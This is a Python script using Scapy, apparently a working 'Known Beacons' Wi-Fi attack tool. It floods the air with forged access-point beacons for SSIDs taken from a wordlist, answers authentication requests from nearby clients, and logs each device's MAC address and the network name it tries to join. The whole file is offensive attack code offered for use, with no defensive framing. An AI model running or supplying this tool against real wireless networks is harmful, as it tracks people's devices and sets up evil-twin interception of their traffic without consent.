#!/usr/bin/python3
from scapy.all import *
from random import random
from sys import stdout
from time import sleep
import argparse

target = 'ff:ff:ff:ff:ff:ff'
conf.verb = 0

WPA = 'ESS+privacy'
OPN = 'ESS'
RATE_1B = b"\x82"
RATE_2B = b"\x84"
RATE_5_5B = b"\x8b"
RATE_11B = b"\x96"

def get_random_mac():
	return "00:0f:00:" + ":".join(list(map(lambda i:"%x"%int(random()*0xff), [i for i in range(3)])))

found = {}
def parse(p):
	global beacons
	if Dot11 in p and p[Dot11].subtype == 11 and p[Dot11].addr3 in beacons.keys():
		if not p[Dot11].addr2 in found:
			#print("[*] Authentication received " + p[Dot11].addr2)
			ans = RadioTap()/Dot11(subtype=11, type=0, addr1=p[Dot11].addr2, addr2=p[Dot11].addr1, addr3=p[Dot11].addr3, ID=p[Dot11].ID)/\
				Dot11Auth(algo=0, seqnum=2, status=0)
			sendp(ans, iface=args.iface, count=1, loop=0)
	elif Dot11 in p and p[Dot11].subtype == 0 and Dot11Elt in p and p[Dot11].addr3 in beacons.keys():
		if not p[Dot11].addr2 in found:
			essid = p[Dot11Elt].info.decode()
			if 'privacy' in p[Dot11AssoReq].cap:
				print("[+] " + p[Dot11].addr2 + " WPA " + essid)
			else:
				print("[+] " + p[Dot11].addr2 + " OPN " + essid)
			found[p[Dot11].addr2] = essid
			try:
				del(beacons[p[Dot11].addr3])
			except:
				pass

def sniffer(iface):
	sniff(iface=iface, prn=parse, store=0)

is_stop = False
def send(beacon):
	while not is_stop:
		sendp(beacon["packet"], iface=args.iface, count=10)
		stdout.write(beacon["essid"] + " "*25 + "\r")
		stdout.flush()

parser = argparse.ArgumentParser(description='Known Beacons - attack of unauthenticated Wi-Fi clients')
parser.add_argument("-i", dest="iface", type=str, metavar='interface', default='100', help="interface for sending 802.11 beacons")
parser.add_argument("-w", dest="essids", type=str, metavar='ESSIDs', default='60', help="wordlist with ESSIDs")
parser.add_argument("-opn", action="store_true", default=False, help="send OPN beacons")
parser.add_argument("-wpa", action="store_true", default=False, help="send WPA beacons")
parser.add_argument("-t", dest="threads", type=int, metavar='threads', default='100', help="simultaneously networks (100)")
parser.add_argument("-T", dest="time", type=int, metavar='seconds', default='60', help="sending time (60)")
args = parser.parse_args()

if not args.opn and not args.wpa:
	args.opn = True

sniffer_thr = Thread(target=sniffer, args=(args.iface,))
sniffer_thr.start()

essids = open(args.essids).read().split("\n")

is_end = False

while not is_end:
	beacons = {}
	is_stop = False
	threads_count = args.threads
	while threads_count > 0:
		if not essids:
			is_end = True
			break
		essid = essids.pop(0)
		if args.opn:
			mac = get_random_mac()
			radio = RadioTap()
			dot11 = Dot11(type=0, subtype=8, addr1=target, addr2=mac, addr3=mac)
			beacon = Dot11Beacon(cap=OPN)/\
				Dot11Elt(ID='SSID',info=essid, len=len(essid))/Dot11Elt(ID='Rates', info=RATE_1B+RATE_2B+RATE_5_5B+RATE_11B)/\
				Dot11Elt(ID='ERPinfo', info=b"\x04")/\
				Dot11Elt(ID='DSset', info=b"\x01")
			beacons[mac] = {"essid": essid, "packet": radio/dot11/beacon, "type": "OPN"}
			threads_count -= 1
		if args.wpa:
			mac = get_random_mac()
			radio = RadioTap()
			dot11 = Dot11(type=0, subtype=8, addr1=target, addr2=mac, addr3=mac)
			beacon = Dot11Beacon(cap=WPA)/\
				Dot11Elt(ID='SSID',info=essid, len=len(essid))/Dot11Elt(ID='Rates', info=RATE_1B+RATE_2B+RATE_5_5B+RATE_11B)/\
				Dot11Elt(ID='ERPinfo', info=b"\x04")/\
				Dot11Elt(ID='DSset', info=b"\x01")
			beacons[mac] = {"essid": essid, "packet": radio/dot11/beacon, "type": "WPA"}
			threads_count -= 1

	threads = []
	for beacon in beacons.values():
		thread = Thread(target=send, args=(beacon,))
		thread.start()
		threads += [thread]

	sleep(args.time)
	is_stop = True
	for thread in threads:
		thread.join()

sniffer_thr.join()
